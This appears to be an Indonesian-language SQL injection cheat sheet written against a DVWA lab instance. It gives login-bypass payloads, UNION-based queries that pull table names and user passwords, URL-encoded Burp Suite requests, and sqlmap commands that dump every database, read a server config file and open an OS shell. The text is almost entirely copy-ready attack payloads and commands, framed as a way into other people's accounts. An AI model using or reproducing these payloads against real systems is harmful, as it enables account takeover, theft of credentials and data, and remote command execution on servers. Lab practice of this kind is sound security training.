## login bypass
teknik masuk ke akun orang lain tanpa tahu password
### Cara Kerja:
Query login asli:
SELECT * FROM users WHERE username = 'admin' AND password = '12345'
Kita ubah input menjadi:
Username: admin' #
Password: (kosong)
Query yang dieksekusi:
SELECT * FROM users WHERE username = 'admin' #' AND password = ''
Tanda # membuat sisa query menjadi komentar (diabaikan).
### contoh payload
login sebagai admin
```bash
admin' #
```
login sebagai user biasa
```bash
' OR 1=1 #
```

## ekstrak database (mengambil data)
teknik mengambil data sensitif dari database
Mencari Jumlah Kolom
```bash
' UNION SELECT 1,2,3 #
```
Jika muncul angka 1,2,3 → kolomnya ada 3.
Melihat Versi Database
```bash
' UNION SELECT version(), 2 #
```
Hasil: 8.0.41 (contoh)
Melihat Nama Database
```bash
' UNION SELECT database(), 2 #
```
Hasil: dvwa
Melihat Semua Tabel
```bash
' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='dvwa' #
```
Hasil: guestbook, users
Melihat Kolom dalam Tabel Users
```bash
' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users' #
```
Hasil: user, password, user_id, dll.
Mengambil Data Users
```bash
' UNION SELECT user, password FROM users #
```

# command burpsuite 
1: Uji Kerentanan
```bash
GET /dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
```
2: Extract Database Name
```bash
GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+database%28%29%2C+2+%23&Submit=Submit HTTP/1.1
```
3: Extract Data Users 
```bash
GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+%23&Submit=Submit HTTP/1.1
```
## contoh command burpsuite lainnya
Cari jumlah kolom	
```bash
id=1%27+ORDER+BY+2+%23&Submit=Submit
```
Lihat database
```bash
id=1%27+UNION+SELECT+database%28%29%2C+2+%23&Submit=Submit
```
Lihat versi MySQL
```bash
id=1%27+UNION+SELECT+version%28%29%2C+2+%23&Submit=Submit
```
Extract data users
```bash
id=1%27+UNION+SELECT+user%2C+password+FROM+users+%23&Submit=Submit
```

# command sql-map 
## 1. CEK KERENTANAN 
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --batch
```
## 2. LIHAT SEMUA DATABASE
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --dbs --batch
```
## 3. LIHAT SEMUA TABEL dalam Database 'dvwa'
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" -D dvwa --tables --batch
```
## 4. LIHAT KOLOM dalam Tabel 'users'
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" -D dvwa -T users --columns --batch
```
## 5. DUMP SEMUA DATA USERS 
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" -D dvwa -T users --dump --batch
```
## 6. DUMP SEMUA DATA 
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --dump --batch
```
## 7. BACA FILE CONFIG 
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --file-read="C:\\laragon\\www\\DVWA\\config\\config.inc.php" --batch
```
## 8. DAPATKAN SHELL 
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --os-shell --batch
```
## command dasar sqlmap
lihat semua database
```bash
--dbs
```
Lihat semua tabel
```bash
--tables
```
Lihat semua kolom
```bash
--columns
```
Ambil semua data
```bash
--dump
```
Auto-yes semua pertanyaan
```bash
--batch
```
